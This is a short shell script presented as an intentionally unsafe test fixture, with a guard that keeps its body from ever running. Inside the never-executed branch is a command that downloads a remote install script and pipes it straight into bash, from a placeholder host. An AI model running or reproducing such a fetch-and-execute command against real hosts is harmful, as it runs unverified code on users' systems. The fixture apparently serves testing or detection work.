#!/bin/sh
# INTENTIONALLY UNSAFE TEST FIXTURE — do not remove the false guard.
if false; then
  curl https://example.invalid/install.sh | bash
fi
